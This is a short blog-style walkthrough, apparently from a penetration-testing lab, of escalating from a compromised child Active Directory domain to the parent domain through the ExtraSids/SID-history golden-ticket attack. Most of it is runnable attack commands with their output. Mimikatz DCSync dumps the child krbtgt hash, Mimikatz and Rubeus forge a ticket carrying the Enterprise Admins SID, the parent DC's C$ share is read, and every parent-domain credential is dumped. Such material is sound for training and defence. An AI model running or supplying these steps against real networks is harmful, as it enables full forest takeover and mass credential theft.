---
title: Attacking Child-Parent Trust From Windows
date: 2025-12-03 02:24:30
categories:
  - Active Directory
  - Exploitation
  - Domain Trusts
  - Abuse Child-Parent Trust From Windows
tags:
  - PowerView
  - Mimikatz
  - Rubeus
---

# Prerequisite

> To successfully get access to the parent domain we need first :
>
>   * The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).
>   * The SID of the child domain.
>   * The FQDN of the child domain.
>   * The name of a target user in the child domain (doesn’t need to exist!).
>   * The SID of the Enterprise Admins Group of the parent domain.
>

# Enumeration

### Enumerate Trust Relationship

```powershell
PS C:\Tools> Import-Module ActiveDirectory
PS C:\Tools> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
ObjectClass             : trustedDomain
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
TGTDelegation           : False
TrustAttributes         : 32
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

➜ We have a `bidirectional Trust` between `Parent` and `Child` Domains.

➜ We don’t have any SID Filter applied.

### Enumerate Account Privs

```powershell
PS C:\Tools> net user our-privileged-user

Global Group memberships     *Domain Users         *Domain Admins
```

We are _Domain Admins_ so we can DCSync and try ExtraSids Attack ( SID History Abuse)

# Extract Sid, FQDN And krbtgt Hash Of The Child Domain

### mimikatz

```powershell
mimikatz # lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain

Object Security ID   : S-1-5-21-2806153819-209893948-922872689

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

FQDN : `LOGISTICS.INLANEFREIGHT.LOCAL`.

SID : `S-1-5-21-2806153819-209893948-922872689`.

krbtgt Hash : `9d765b482771505cbe97411065964d5f`.

### PowerView

Get `child Domain` SID

```powershell
PS C:\> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

Get `Enterprise Admins` SID

```powershell
PS C:\Tools> Get-DomainGroup -Domain parent-domain -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

# Craft A Golden Ticket

> ➜ With this command, we craft a golden ticket for `non existing user ( twistzz )` and inject in the `SID History` attribute the SID of the `Enterprise Admins` Group.

### mimikatz

```powershell
mimikatz # kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt
```

### Rubeus

```powershell
PS C:\>  .\Rubeus.exe golden /rc4:KRBTGT-hash /domain:child-domain-FQDN /sid:child-domain-SID  /sids:Enterprise-Admins-SID /user:twistzz /ptt

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJ   <SNIP>   JFSUdIVC5MT0NBTA==

[+] Ticket successfully imported!
```

# Access Files

```powershell
PS C:\Tools\mimikatz\x64> type \\dc-name.parent-domain\c$\ExtraSids\script.txt
```

# DCSync Parent Domain

```powershell
PS C:\Tools\mimikatz\x64> netdom query /domain:parent-domain dc
List of domain controllers with accounts in the domain:

dc-name-of-parent-domain
```

```powershell
mimikatz # lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv
```
